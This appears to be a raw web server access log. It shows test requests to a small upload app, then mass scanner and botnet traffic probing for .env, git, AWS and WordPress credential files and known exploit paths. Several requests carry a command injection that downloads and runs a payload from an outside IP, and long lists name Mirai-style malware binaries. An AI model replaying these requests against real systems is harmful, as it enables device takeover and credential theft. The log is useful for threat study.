URI: /
URI: /user/prova
URI: /
URI: /public/prova
URI: /upload/prova/In?password=prova
URI: /uploads/prova_In?password=prova_b6a735b8-d330-45a9-885b-c05dd9d52b7a.jpeg
URI: /upload/prova/In?password=prova
URI: /user/prova
URI: /main/webservices/additional_webservices.php
URI: /
URI: /
URI: /favicon.ico
URI: /
URI: /
URI: /user/prova?password=prova
URI: /user/prova
URI: /user/test
URI: /user/test?password=test
URI: /
URI: /user/test?password=test
URI: /public/prova
URI: /public/test
URI: /public/prova
URI: /public/prova
URI: /user/test
URI: /public/test
URI: /public/test
URI: /
URI: /upload/nicolo/Bi?password=nicolo
URI: /user/nicolo
URI: /upload/nicolo/Bi?password=nicolo
URI: /uploads/nicolo_Bi?password=nicolo_b6a735b8-d330-45a9-885b-c05dd9d52b7a.jpeg
URI: /
URI: /public/nicolo
URI: /
URI: /user/nicolo?password=nicolo
URI: /
URI: /
URI: /
URI: /
URI: /favicon.ico
URI: /public/prova
URI: /public/nicolo
URI: /
URI: /public/nicolo
URI: /user/nicolo?password=nicolo
URI: /public/prova
URI: /public/prova
URI: /public/prova
URI: /user/nicolo?password=nicolo
URI: /favicon.ico
URI: /user/nicolo?password=nicolo
URI: /user/nicolo?password=nicolo
URI: /user/nicolo
URI: /favicon.ico
URI: /favicon.ico
URI: /favicon.ico
URI: /.env
URI: /hello
URI: /hello
URI: /.git/config
URI: /hello
URI: /boaform/admin/formLogin?username=admin&psd=admin
URI: /version
URI: /aws.yml
URI: /.env.bak
URI: /.env
URI: /containers/json
URI: /config/aws.yml
URI: ///wp-admin/setup-config.php?step=1
URI: ///wordpress/wp-admin/setup-config.php?step=1
URI: ///wp-admin/install.php?step=1
URI: /Autodiscover/Autodiscover.xml
URI: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
URI: /solr/admin/info/system?wt=json
URI: /console/
URI: /_ignition/execute-solution
URI: /actuator/gateway/routes
URI: /geoserver
URI: /.env
URI: /robots.txt
URI: /sitemap.xml
URI: /.well-known/security.txt
URI: /manager/html
URI: /main/webservices/additional_webservices.php
URI: /.env
URI: /.env
URI: /geoserver/web/
URI: /HNAP1/
URI: /druid/index.html
URI: /form.html
URI: /upl.php
URI: /t4
URI: /geoip/
URI: /1.php
URI: /systembc/password.php
URI: /password.php
URI: /.env
URI: /shell?cd+/tmp;rm+holdarm+hold.arm7;wget+http:/\/193.143.1.66/bins/hold.arm7;chmod+777+hold.arm7;./hold.arm7+hold.jaws;wget+http:/\/193.143.1.66/bins/hold.arm;chmod+777+hold.arm;./hold.arm+hold.jaws
URI: /.env
URI: /.env
URI: /cf_scripts/scripts/ajax/ckeditor/ckeditor.js
URI: /boaform/admin/formLogin
URI: /license.txt
URI: /wp-json
URI: /hello
URI: /.env
URI: /actuator/gateway/routes
URI: /.git/config
URI: /.env
URI: /.env
URI: /geoserver/web/
URI: /shell?cd+/tmp;rm+holdarm+hold.arm7;wget+http:/\/193.143.1.66/bins/hold.arm7;chmod+777+hold.arm7;./hold.arm7+hold.jaws;wget+http:/\/193.143.1.66/bins/hold.arm;chmod+777+hold.arm;./hold.arm+hold.jaws
URI: /robots.txt
URI: /.env
URI: /asdf.php
URI: /pinfo.php
URI: /phpversion.php
URI: /old_phpinfo.php
URI: /infos.php
URI: /php-info.php
URI: /dashboard/phpinfo.php
URI: /phpinfo.php3
URI: /phpinfo.php4
URI: /phpinfo.php5
URI: /_profiler/phpinfo.php
URI: /laravel/core/.env
URI: /beta/.env
URI: /kyc/.env
URI: /admin/.env
URI: /prod/.env
URI: /api/.env
URI: /.docker/.env
URI: /app/.env
URI: /crm/.env
URI: /backend/.env
URI: /local/.env
URI: /application/.env
URI: /laravel/.env
URI: /shared/.env
URI: /.env.project
URI: /apps/.env
URI: /development/.env
URI: /_profiler/phpinfo
URI: /phpinfo.php
URI: /info.php
URI: /.env.bak
URI: /.env.config
URI: /.env.backup
URI: /.env.dist
URI: /.env.docker
URI: /.env.docker.dev
URI: /.env.example
URI: /.env.local
URI: /.env.sample
URI: /.env.save
URI: /.env.stage
URI: /.env.travis
URI: /.envrc
URI: /.envs
URI: /config/aws.yml
URI: /symfony/_profiler/phpinfo
URI: /phpinfo
URI: /login?pp=enable&pp=env
URI: /.aws/credentials
URI: /config.js
URI: /config/config.json
URI: /wp-config.php.bak
URI: /wp-config.php
URI: /.wp-config.php.swp
URI: /wp-config.php.old
URI: /index.php/phpinfo
URI: /application/config/constants.php
URI: /dev/phpinfo.php
URI: /php_info.php
URI: /install/index.php
URI: /config.php
URI: /php.php
URI: /config/app.php
URI: /.env.php
URI: /public/.env
URI: /content/.env
URI: /:80/.env
URI: /:443/.env
URI: /:432/.env
URI: /:8000/.env
URI: /:8080/.env
URI: /tool/view/phpinfo.view.php
URI: /debug/default/view?panel=config/frontend_dev.php
URI: /admin/app.js
URI: /admin/server.js
URI: /symfony/public/_profiler/phpinfo
URI: /symfony/public
URI: /api/config.js
URI: /config/environments/database.rb
URI: /appsettings.json
URI: /admin/wp-config
URI: /wp-config.php-backup
URI: /config.ini
URI: /config/settings.py
URI: /server/settings.py
URI: /storage/logs/laravel.log
URI: /Lara/.env
URI: /api/shared/config/config.env
URI: /api/shared/config.env
URI: /config.env
URI: /production/.env
URI: /dev/.env
URI: /api/shared/config/.env
URI: /api/shared/.env
URI: /api/config.env
URI: /core/.env
URI: /admin/server_info.php
URI: /server_info.php
URI: /admincontrol/sys_phpinfo.php
URI: /actuator/health
URI: /c/
URI: /stalker_portal/server/tools/auth_simple.php
URI: /.git/index
URI: /bin.sh
URI: /i
URI: /Mozi.m
URI: /Mozi.a
URI: /i5
URI: /Josho.arm6
URI: /Josho.m68k
URI: /bot.arm6
URI: /bot.ppc
URI: /pmips
URI: /px86
URI: /parm6
URI: /parm5
URI: /m68k
URI: /pmpsl
URI: /test
URI: /amd64
URI: /sh4
URI: /parm
URI: /pm68k
URI: /spc
URI: /mips
URI: /mips64
URI: /Josho.ppc
URI: /Josho.mips
URI: /aarch64
URI: /bot.sh4
URI: /powerpc
URI: /bot.x86_64
URI: /x86
URI: /bot.m68k
URI: /mipsel
URI: /armv7l
URI: /bot.arm7
URI: /tmips
URI: /sora.arm5
URI: /debug.dbg
URI: /sora.x86_64
URI: /i686
URI: /Josho.x86
URI: /sora.m68k
URI: /Josho.arm7
URI: /sora.i686
URI: /armv5l
URI: /Josho.sh4
URI: /main_arm7
URI: /sora.sh4
URI: /arc
URI: /main_m68k
URI: /sora.arm7
URI: /armv4l
URI: /main_mips
URI: /main_sh4
URI: /arm7
URI: /sora.ppc
URI: /main_x86
URI: /x86_64
URI: /main_arm6
URI: /sora.mpsl
URI: /arm
URI: /arm5
URI: /armv6l
URI: /arm6
URI: /Josho.arm5
URI: /sparc
URI: /mpsl
URI: /ppc
URI: /Josho.mpsl
URI: /main_arm5
URI: /main_mpsl
URI: /main_x86_64
URI: /main_ppc
URI: /sora.mips
URI: /sora.x86
URI: /sora.arm6
URI: /splmpsl
URI: /zerarm5
URI: /zerarm7
URI: /nabarm
URI: /nabarm6
URI: /jklm68k
URI: /jklarm7
URI: /nklarm7
URI: /zerm68k
URI: /nklarm6
URI: /nabspc
URI: /zerspc
URI: /splarm6
URI: /nabmips
URI: /jklmips
URI: /jklarm6
URI: /zerx86
URI: /nklx86
URI: /zerarm
URI: /nklsh4
URI: /nklmips
URI: /splarm5
URI: /dlr.mpsl
URI: /jklsh4
URI: /dlr.sh4
URI: /splx86
URI: /splarm
URI: /nabarm5
URI: /zermips
URI: /splsh4
URI: /splspc
URI: /dlr.arm
URI: /nklarm
URI: /dlr.spc
URI: /nklm68k
URI: /zermpsl
URI: /nklmpsl
URI: /nabarm7
URI: /dlr.mips
URI: /nklarm5
URI: /jklarm5
URI: /dlr.arm5
URI: /zersh4
URI: /nabm68k
URI: /dlr.arm6
URI: /nabppc
URI: /zerppc
URI: /nklppc
URI: /dlr.ppc
URI: /zerarm6
URI: /dlr.arm7
URI: /jklx86
URI: /jklmpsl
URI: /nabx86
URI: /dlr.m68k
URI: /jklppc
URI: /splarm7
URI: /nabmpsl
URI: /nklspc
URI: /dlr.x86
URI: /splm68k
URI: /jklspc
URI: /jklarm
URI: /nabsh4
URI: /splmips
URI: /splppc
URI: /hidakibest.mpsl
URI: /hidakibest.ppc
URI: /hidakibest.arm4
URI: /hidakibest.sparc
URI: /hidakibest.arm5
URI: /hidakibest.x86
URI: /hidakibest.mips
URI: /hidakibest.arm6
URI: /hidakibest.arm7
URI: /wget.sh
URI: /x
URI: /cn
URI: /zxc.sh
URI: /curl.sh
URI: /tftp.sh
URI: /ftpget.sh
URI: /x86_32
URI: /byte.arm5
URI: /byte.spc
URI: /byte.mips
URI: /byte.arm7
URI: /byte.m68k
URI: /byte.mpsl
URI: /byte.arm6
URI: /byte.arm
URI: /byte.ppc
URI: /byte.sh4
URI: /byte.x86
URI: /nshppc
URI: /nsharm6
URI: /nsharm7
URI: /nsharm
URI: /nshmpsl
URI: /nshmips
URI: /gmpsl
URI: /nsharm5
URI: /nshsh4
URI: /harm5
URI: /hmips
URI: /earm
URI: /esh4
URI: /earm5
URI: /earm7
URI: /emips
URI: /eppc
URI: /empsl
URI: /nrarm7
URI: /gmips
URI: /garm6
URI: /garm
URI: /garm7
URI: /garm5
URI: /nrsh4
URI: /gppc
URI: /nrmips
URI: /nrppc
URI: /arm4
URI: /vqkjf64
URI: /main_arm
URI: /boatnet.spc
URI: /boatnet.sh4
URI: /boatnet.ppc
URI: /boatnet.arm6
URI: /boatnet.m68k
URI: /boatnet.arm7
URI: /bot.arm5
URI: /bot.mpsl
URI: /bot.mips
URI: /bot.x86
URI: /bot.arm
URI: /boatnet.mpsl
URI: /boatnet.x86
URI: /boatnet.mips
URI: /boatnet.arm
URI: /boatnet.arm5
URI: /botnet.mpsl
URI: /botnet.sh4
URI: /botnet.arm5
URI: /botnet.spc
URI: /botnet.arm7
URI: /botnet.mips
URI: /botnet.m68k
URI: /botnet.arm6
URI: /botnet.x86
URI: /yakuza.arm6
URI: /jade.arm6
URI: /jade.m68k
URI: /vwkjebwi686
URI: /qkehusl
URI: /vkjqpc
URI: /vsbeps
URI: /wheiuwa4
URI: /vqsjh4
URI: /dvwkja7
URI: /kjsusa6
URI: /jade.mpsl
URI: /jade.spc
URI: /jade.ppc
URI: /jade.arm7
URI: /jade.sh4
URI: /jade.mips
URI: /jade.arm
URI: /jade.arm5
URI: /jade.x86
URI: /la.bot.powerpc
URI: /arm6.nn
URI: /boatnet.arc
URI: /sarm6
URI: /p-p.c-.Sakura
URI: /m-p.s-l.Sakura
URI: /la.bot.mips
URI: /la.bot.m68k
URI: /la.bot.mipsel
URI: /la.bot.arm
URI: /i486
URI: /i586
URI: /sarm
URI: /m-6.8-k.Sakura
URI: /arm7.nn
URI: /a-r.m-5.Sakura
URI: /la.bot.arm7
URI: /sarm7
URI: /a-r.m-4.Sakura
URI: /m-i.p-s.Sakura
URI: /la.bot.sh4
URI: /sarm5
URI: /x-8.6-.Sakura
URI: /a-r.m-6.Sakura
URI: /smips
URI: /smpsl
URI: /x86_32.nn
URI: /la.bot.arm5
URI: /la.bot.arm6
URI: /la.bot.sparc
URI: /s-h.4-.Sakura
URI: /a-r.m-7.Sakura
URI: /i-5.8-6.Sakura
URI: /mips.nn
URI: /mipsel.nn
URI: /arm5.nn
URI: /arm.nn
URI: /x86_64.nn
URI: /mirai.sh4
URI: /mirai.arm7
URI: /mirai.m68k
URI: /mirai.mips
URI: /mirai.spc
URI: /mirai.arm
URI: /mirai.x86
URI: /dss
URI: /aisuru.mips
URI: /586
URI: /co
URI: /tftp
URI: /Demon.i686
URI: /Demon.sh4
URI: /Demon.arm7
URI: /Demon.mpsl
URI: /Demon.mips
URI: /Demon.x86
URI: /Demon.arm6
URI: /yakuza.i586
URI: /yakuza.x86
URI: /yakuza.mips
URI: /yakuza.arm4
URI: /yakuza.m68k
URI: /yakuza.ppc
URI: /mirai.mpsl
URI: /bins.sh
URI: /mirai.ppc
URI: /arm61
URI: /dc
URI: /scar
URI: /bin.mipsel
URI: /bin.m68k
URI: /bin.i586
URI: /bin.armv5l
URI: /bin.mips
URI: /bin.sh4
URI: /bin.x86_64
URI: /bin.armv4l
URI: /bin.armv7l
URI: /bin.armv6l
URI: /blink
URI: /roze.x86
URI: /roze.i586
URI: /.Sm68k
URI: /.Smips
URI: /roze.ppc
URI: /roze.sh4
URI: /roze.m68k
URI: /roze.armv4
URI: /.Ssh4
URI: /roze.mips
URI: /roze.armv5
URI: /roze.armv6
URI: /roze.i686
URI: /roze.mipsel
URI: /bin.i686
URI: /roze.sparc
URI: /redtail.x86_64
URI: /sora.spc
URI: /sora.arm
URI: /db0fa4b8db0333367e9bda3ab68b8042.ppc
URI: /db0fa4b8db0333367e9bda3ab68b8042.mpsl
URI: /db0fa4b8db0333367e9bda3ab68b8042.x86
URI: /db0fa4b8db0333367e9bda3ab68b8042.m68k
URI: /db0fa4b8db0333367e9bda3ab68b8042.spc
URI: /db0fa4b8db0333367e9bda3ab68b8042.mips
URI: /db0fa4b8db0333367e9bda3ab68b8042.arm7
URI: /db0fa4b8db0333367e9bda3ab68b8042.arm
URI: /db0fa4b8db0333367e9bda3ab68b8042.arm5
URI: /db0fa4b8db0333367e9bda3ab68b8042.i686
URI: /db0fa4b8db0333367e9bda3ab68b8042.sh4
URI: /db0fa4b8db0333367e9bda3ab68b8042.arm6
URI: /db0fa4b8db0333367e9bda3ab68b8042.arc
URI: /earc
URI: /ex86
URI: /bot.spc
URI: /qkbfi86
URI: /boatnet.x86_64
URI: /boatnet.i686
URI: /cron
URI: /bash
URI: /ntpd
URI: /wget
URI: /openssh
URI: /ftp
URI: /apache2
URI: /pftp
URI: /sshd
URI: /sh
URI: /t
URI: /tarm6
URI: /tarm
URI: /tsh4
URI: /tarm5
URI: /tmpsl
URI: /tppc
URI: /tarm7
URI: /tspc
URI: /a
URI: /bolubotnetm68k
URI: /bolubotnetx86
URI: /bolubotnetarm5
URI: /bolubotnetarm6
URI: /bolubotnetarm7
URI: /bolubotnetarm
URI: /bolubotnetmips
URI: /bolubotnetx86_64
URI: /bolubotnetmpsl
URI: /bolubotnetsh4
URI: /bolubotnetppc
URI: /.i
URI: /nullnet_load.arm
URI: /nullnet_load.arm7
URI: /i6
URI: /runtime
URI: /xd.mpsl
URI: /xd.arm5
URI: /xd.m68k
URI: /xd.arm
URI: /xd.arm6
URI: /xd.mips
URI: /xd.sh4
URI: /xd.ppc
URI: /xd.x86
URI: /xd.arm7
URI: /rebirth.mips
URI: /rebirth.arm6
URI: /rebirth.i686
URI: /rebirth.arm5
URI: /rebirth.m68
URI: /rebirth.mpsl
URI: /.Sarm
URI: /skid.arm6
URI: /zte
URI: /acmips
URI: /acarm7
URI: /acarm5
URI: /acmipsel
URI: /firmware.mips
URI: /firmware.mipsel
URI: /firmware.x86_64
URI: /firmware.armv5l
URI: /firmware.armv4l
URI: /firmware.arc
URI: /firmware.armv6l
URI: /firmware.armv7l
URI: /firmware.sh4
URI: /r
URI: /go.sh
URI: /.Sppc
URI: /.Sarm5
URI: /.Smpsl
URI: /.Sarm6
URI: /.Sarm7
URI: /.Sx86_64
URI: /.Sspc
URI: /.Sx86
URI: /sh4.nn
URI: /server
URI: /fjwwofba5
URI: /wriww68k
URI: /dwhdbg
URI: /x-3.2-.Sakura
URI: /goahead
URI: /m68k.nn
URI: /tel.arm7
URI: /tel.arm6
URI: /tel.arm
URI: /tel.x86
URI: /tel.arm5
URI: /tel.mpsl
URI: /tel.mips
URI: /lol
URI: /sparc.nn
URI: /powerpc.nn
URI: /0daympsl
URI: /earm6
URI: /c.sh
URI: /w.sh
URI: /b
URI: /panax86
URI: /jbrute
URI: /2023
URI: /mig
URI: /ps2
URI: /fdgsfg
URI: /bx
URI: /gocl
URI: /multi
URI: /k.sh
URI: /weed
URI: /ipc
URI: /adb
URI: /aaa
URI: /z.sh
URI: /jaws
URI: /zz
URI: /fb
URI: /f5
URI: /mag
URI: /av.sh
URI: /li
URI: /ruck
URI: /sd
URI: /lll
URI: /irz
URI: /vc
URI: /xaxa
URI: /g
URI: /toto
URI: /asd
URI: /test.sh
URI: /linksys
URI: /hoho.arm
URI: /hoho.x86
URI: /hoho.sh4
URI: /hoho.arm7
URI: /hoho.mips
URI: /hoho.ppc
URI: /hoho.m68k
URI: /hoho.arm5
URI: /hoho.mpsl
URI: /hoho.arm6
URI: /Aqua.arm6
URI: /Aqua.arm5
URI: /Aqua.mips
URI: /Aqua.arm7
URI: /Aqua.x86
URI: /Aqua.mpsl
URI: /Aqua.arm4
URI: /rebirth.arm4t
URI: /386
URI: /linux
URI: /zmap.mips
URI: /zmap.x86_64
URI: /zmap.arm7
URI: /zmap.x86
URI: /zmap.arm6
URI: /zmap.spc
URI: /zmap.m68k
URI: /zmap.arm
URI: /zmap.ppc
URI: /zmap.mpsl
URI: /zmap.arm5
URI: /zmap.sh4
URI: /custom.spc
URI: /updates.mpsl
URI: /miraint.arm7
URI: /updates.spc
URI: /updates.ppc
URI: /updates.m68k
URI: /updates.sh4
URI: /updates.arm6
URI: /updates.arm7
URI: /updates.arm5
URI: /updates.arc
URI: /updates.i686
URI: /updates.arm
URI: /updates.x86
URI: /updates.mips
URI: /xd.spc
URI: /KKveTTgaAAsecNNaaaa.sh4
URI: /KKveTTgaAAsecNNaaaa.i686
URI: /KKveTTgaAAsecNNaaaa.arm
URI: /KKveTTgaAAsecNNaaaa.ppc
URI: /KKveTTgaAAsecNNaaaa.mpsl
URI: /KKveTTgaAAsecNNaaaa.i486
URI: /KKveTTgaAAsecNNaaaa.m68k
URI: /KKveTTgaAAsecNNaaaa.x86_64
URI: /KKveTTgaAAsecNNaaaa.mips
URI: /KKveTTgaAAsecNNaaaa.x86
URI: /KKveTTgaAAsecNNaaaa.arm7
URI: /KKveTTgaAAsecNNaaaa.spc
URI: /KKveTTgaAAsecNNaaaa.arm6
URI: /KKveTTgaAAsecNNaaaa.arc
URI: /KKveTTgaAAsecNNaaaa.arm5
URI: /s
URI: /f
URI: /darm
URI: /darm6
URI: /darm5
URI: /zte.arm7
URI: /tarc
URI: /darm7
URI: /botnt.mpsl
URI: /botnt.arm5
URI: /aisuru.arm5
URI: /aisuru.arm
URI: /botnt.arm7
URI: /aisuru.i586
URI: /botnt.mips
URI: /aisuru.ppc
URI: /aisuru.i686
URI: /aisuru.arm7
URI: /botnt.arm
URI: /botnt.armv7v5
URI: /aisuru.mpsl
URI: /gx86
URI: /pov
URI: /j
URI: /r.sh
URI: /h
URI: /t.sh
URI: /tenda.sh
URI: /gg
URI: /lil
URI: /Aqua.sh4
URI: /Aqua.ppc
URI: /Aqua.x86_64
URI: /Aqua.m68k
URI: /skid.mips
URI: /c.x86
URI: /miraint.mips
URI: /aodpash4
URI: /dmlsaa5
URI: /okgsdbg
URI: /vsos68k
URI: /vsjsjpc
URI: /lkssn686
URI: /sngosia7
URI: /fosfsa4
URI: /kjnfvaa6
URI: /Aqua.dbg
URI: /Aqua.i686
URI: /jafjn64
URI: /sjfudps
URI: /anfoa86
URI: /ysjssl
URI: /Aqua.86
URI: /firmware.i586
URI: /firmware.i686
URI: /firmware.powerpc
URI: /firmware.m68k
URI: /firmware.sparc
URI: /c.arm
URI: /c.arm6
URI: /c.arm7
URI: /c.arm5
URI: /c.m68k
URI: /c.mpsl
URI: /c.mips
URI: /c.ppc
URI: /c.spc
URI: /x-8.6-.ISIS
URI: /firmware.arm-linux-gnueabihf
URI: /create.py
URI: /sdt
URI: /miraint.spc
URI: /miraint.mpsl
URI: /miraint.sh4
URI: /miraint.m68k
URI: /miraint.arm
URI: /miraint.ppc
URI: /mirai.gnueabihf
URI: /miraint.arm5n
URI: /mirai.arm5n
URI: /best.ppc
URI: /best.arm
URI: /best.arm4
URI: /best.x86
URI: /best.arm5
URI: /best.mips
URI: /best.mpsl
URI: /best.arm7
URI: /arm5n
URI: /aisuru.aarch64
URI: /cyber-ppc
URI: /cyber-arm4
URI: /cyber-arm6
URI: /cyber-arm7
URI: /cyber-x86
URI: /cyber-mips
URI: /cyber-arm5
URI: /cyber-sh4
URI: /cyber-m68k
URI: /cyber-mpsl
URI: /mirai.armv4l
URI: /mirai.bin
URI: /mirai.arc
URI: /mirai.x86_64
URI: /mirai.powerpc
URI: /mirai.mipsel
URI: /botx.arm6
URI: /botx.x86
URI: /botx.mips
URI: /botx.arm5
URI: /botx.m68k
URI: /botx.sh4
URI: /botx.ppc
URI: /botx.mpsl
URI: /botx.arm
URI: /botx.spc
URI: /mirai.i586
URI: /mirai.sparc
URI: /mirai.i686
URI: /skid.mpsl
URI: /iUeQQNFZ9vwOLXIBiZ4156FCf1nexMVYnW
URI: /lleJwlAImyqhwZhZbB4dwBpBt4quciaLIx
URI: /oFcmE1FgKhne42UgV8PwFKEfPr8uhc21Zt
URI: /jOjCsc6Lb1rfzqKpKE3ERtlNUMhVHKezYs
URI: /iR8yH0i1CmTagbpd5LAkUyKPelq5OSIWoO
URI: /gJ6oXExmNUtJlKPCezUadEGTjUqWrrQ4Yt
URI: /Vagi7meiueBttLimeY0QohYvyNii9y4zMR
URI: /ggIPjWoiO55CN4uLVMsA2oFwFP7Fau1TaI
URI: /2qwYcUyrntHY24EcShZNxGEQajLpAzKO5c
URI: /BOBYOkW9NldfT5hBXi13puYhvLpwLH5Z4m
URI: /2Bs8JFpFOqBiXgfSVDNolN4qmaxmtBrJlm
URI: /q24SnZsLiPrkf7mgfxxwiPjZ5o2OXBksEW
URI: /6mXYDuVjkYQ1THGXik9a0pAAofy3U2Zedb
URI: /G7ulzVjYC59VOtF7T9QRQXEtGjH8ckO0Nx
URI: /mirai.arm5l
URI: /mirai.arm6l
URI: /mirai.arm7l
URI: /4GjvJv2WsEeK4KTW0T7MoUu6GFrVlEyqys
URI: /2cpQFAm7HV04FsKexa9uMBzKlDGABg5fBT
URI: /o1KlQxcBl3RfqQL7zG2YMZChDur2XyW7rZ
URI: /zTaBQw506jGO33uhyBoSdNcgv09WUPD8Y8
URI: /wbAWQYT0xzzpN2gPgC6tPXwKDAmspSLk3G
URI: /rTXnteGnn93dfOstrEOasxXXqGQ2rInU61
URI: /gGJIqCld032lUfErvEnt9mwuLIMjt1yOTS
URI: /rZ3aQaDA4r95eJhrZbpBjl8FvbP77WccK6
URI: /xq4zikwLeks9Xjz1V3aU1JS889foqeBjys
URI: /R47OpVdwilbnyY6yCcL0KWNQs1oYCjOuPe
URI: /clbvJjUAuql4HKwTEUnbimMOyxEzGr8CX7
URI: /bpJncUEIUmAgsWjqraqMMn5GluYkLUoPuW
URI: /8vEmyqB6zPykzUL4el08zYwL60DpfB6iNy
URI: /caak72W97tDc3EghxgOox2pYD4rZXRr9YX
URI: /Ares.arm
URI: /Ares.arm7
URI: /botx.arm7
URI: /noob.mips
URI: /noob.x86
URI: /noob.armn
URI: /noob.arm4
URI: /noob.arm7
URI: /noob.arm5
URI: /noob.ppc
URI: /noob.mpsl
URI: /curl
URI: /o
URI: /boaform/admin/formLogin?username=user&psd=user
URI: /_profiler/phpinfo
URI: /shell?cd+/tmp;rm+holdarm+hold.arm7;wget+http:/\/193.143.1.66/bins/hold.arm7;chmod+777+hold.arm7;./hold.arm7+hold.jaws;wget+http:/\/193.143.1.66/bins/hold.arm;chmod+777+hold.arm;./hold.arm+hold.jaws
URI: /bin.sh
URI: /i
URI: /Mozi.m
URI: /Mozi.a
URI: /i5
URI: /Josho.arm6
URI: /Josho.m68k
URI: /bot.arm6
URI: /bot.ppc
URI: /pmips
URI: /px86
URI: /parm6
URI: /parm5
URI: /m68k
URI: /pmpsl
URI: /test
URI: /amd64
URI: /sh4
URI: /parm
URI: /pm68k
URI: /spc
URI: /mips
URI: /mips64
URI: /Josho.ppc
URI: /Josho.mips
URI: /aarch64
URI: /bot.sh4
URI: /powerpc
URI: /bot.x86_64
URI: /x86
URI: /bot.m68k
URI: /mipsel
URI: /armv7l
URI: /bot.arm7
URI: /tmips
URI: /sora.arm5
URI: /debug.dbg
URI: /sora.x86_64
URI: /i686
URI: /Josho.x86
URI: /sora.m68k
URI: /Josho.arm7
URI: /sora.i686
URI: /armv5l
URI: /Josho.sh4
URI: /main_arm7
URI: /sora.sh4
URI: /arc
URI: /main_m68k
URI: /sora.arm7
URI: /armv4l
URI: /main_mips
URI: /main_sh4
URI: /arm7
URI: /sora.ppc
URI: /main_x86
URI: /x86_64
URI: /main_arm6
URI: /sora.mpsl
URI: /arm
URI: /arm5
URI: /armv6l
URI: /arm6
URI: /Josho.arm5
URI: /sparc
URI: /mpsl
URI: /ppc
URI: /Josho.mpsl
URI: /main_arm5
URI: /main_mpsl
URI: /main_x86_64
URI: /main_ppc
URI: /sora.mips
URI: /sora.x86
URI: /sora.arm6
URI: /splmpsl
URI: /zerarm5
URI: /zerarm7
URI: /nabarm
URI: /nabarm6
URI: /jklm68k
URI: /jklarm7
URI: /nklarm7
URI: /zerm68k
URI: /nklarm6
URI: /nabspc
URI: /zerspc
URI: /splarm6
URI: /nabmips
URI: /jklmips
URI: /jklarm6
URI: /zerx86
URI: /nklx86
URI: /zerarm
URI: /nklsh4
URI: /nklmips
URI: /splarm5
URI: /dlr.mpsl
URI: /jklsh4
URI: /dlr.sh4
URI: /splx86
URI: /splarm
URI: /nabarm5
URI: /zermips
URI: /splsh4
URI: /splspc
URI: /dlr.arm
URI: /nklarm
URI: /dlr.spc
URI: /nklm68k
URI: /zermpsl
URI: /nklmpsl
URI: /nabarm7
URI: /dlr.mips
URI: /nklarm5
URI: /jklarm5
URI: /dlr.arm5
URI: /zersh4
URI: /nabm68k
URI: /dlr.arm6
URI: /nabppc
URI: /zerppc
URI: /nklppc
URI: /dlr.ppc
URI: /zerarm6
URI: /dlr.arm7
URI: /jklx86
URI: /jklmpsl
URI: /nabx86
URI: /dlr.m68k
URI: /jklppc
URI: /splarm7
URI: /nabmpsl
URI: /nklspc
URI: /dlr.x86
URI: /splm68k
URI: /jklspc
URI: /jklarm
URI: /nabsh4
URI: /splmips
URI: /splppc
URI: /hidakibest.mpsl
URI: /hidakibest.ppc
URI: /hidakibest.arm4
URI: /hidakibest.sparc
URI: /hidakibest.arm5
URI: /hidakibest.x86
URI: /hidakibest.mips
URI: /hidakibest.arm6
URI: /hidakibest.arm7
URI: /wget.sh
URI: /x
URI: /cn
URI: /zxc.sh
URI: /curl.sh
URI: /tftp.sh
URI: /ftpget.sh
URI: /x86_32
URI: /byte.arm5
URI: /byte.spc
URI: /byte.mips
URI: /byte.arm7
URI: /byte.m68k
URI: /byte.mpsl
URI: /byte.arm6
URI: /byte.arm
URI: /byte.ppc
URI: /byte.sh4
URI: /byte.x86
URI: /nshppc
URI: /nsharm6
URI: /nsharm7
URI: /nsharm
URI: /nshmpsl
URI: /nshmips
URI: /gmpsl
URI: /nsharm5
URI: /nshsh4
URI: /harm5
URI: /hmips
URI: /earm
URI: /esh4
URI: /earm5
URI: /earm7
URI: /emips
URI: /eppc
URI: /empsl
URI: /nrarm7
URI: /gmips
URI: /garm6
URI: /garm
URI: /garm7
URI: /garm5
URI: /nrsh4
URI: /gppc
URI: /nrmips
URI: /nrppc
URI: /arm4
URI: /vqkjf64
URI: /main_arm
URI: /boatnet.spc
URI: /boatnet.sh4
URI: /boatnet.ppc
URI: /boatnet.arm6
URI: /boatnet.m68k
URI: /boatnet.arm7
URI: /bot.arm5
URI: /bot.mpsl
URI: /bot.mips
URI: /bot.x86
URI: /bot.arm
URI: /boatnet.mpsl
URI: /boatnet.x86
URI: /boatnet.mips
URI: /boatnet.arm
URI: /boatnet.arm5
URI: /botnet.mpsl
URI: /botnet.sh4
URI: /botnet.arm5
URI: /botnet.spc
URI: /botnet.arm7
URI: /botnet.mips
URI: /botnet.m68k
URI: /botnet.arm6
URI: /botnet.x86
URI: /yakuza.arm6
URI: /jade.arm6
URI: /jade.m68k
URI: /vwkjebwi686
URI: /qkehusl
URI: /vkjqpc
URI: /vsbeps
URI: /wheiuwa4
URI: /vqsjh4
URI: /dvwkja7
URI: /kjsusa6
URI: /jade.mpsl
URI: /jade.spc
URI: /jade.ppc
URI: /jade.arm7
URI: /jade.sh4
URI: /jade.mips
URI: /jade.arm
URI: /jade.arm5
URI: /jade.x86
URI: /la.bot.powerpc
URI: /arm6.nn
URI: /boatnet.arc
URI: /sarm6
URI: /p-p.c-.Sakura
URI: /m-p.s-l.Sakura
URI: /la.bot.mips
URI: /la.bot.m68k
URI: /la.bot.mipsel
URI: /la.bot.arm
URI: /i486
URI: /i586
URI: /sarm
URI: /m-6.8-k.Sakura
URI: /arm7.nn
URI: /a-r.m-5.Sakura
URI: /la.bot.arm7
URI: /sarm7
URI: /a-r.m-4.Sakura
URI: /m-i.p-s.Sakura
URI: /la.bot.sh4
URI: /sarm5
URI: /x-8.6-.Sakura
URI: /a-r.m-6.Sakura
URI: /smips
URI: /smpsl
URI: /x86_32.nn
URI: /la.bot.arm5
URI: /la.bot.arm6
URI: /la.bot.sparc
URI: /s-h.4-.Sakura
URI: /a-r.m-7.Sakura
URI: /i-5.8-6.Sakura
URI: /mips.nn
URI: /mipsel.nn
URI: /arm5.nn
URI: /arm.nn
URI: /x86_64.nn
URI: /mirai.sh4
URI: /mirai.arm7
URI: /mirai.m68k
URI: /mirai.mips
URI: /mirai.spc
URI: /mirai.arm
URI: /mirai.x86
URI: /dss
URI: /aisuru.mips
URI: /586
URI: /co
URI: /tftp
URI: /Demon.i686
URI: /Demon.sh4
URI: /Demon.arm7
URI: /Demon.mpsl
URI: /Demon.mips
URI: /Demon.x86
URI: /Demon.arm6
URI: /yakuza.i586
URI: /yakuza.x86
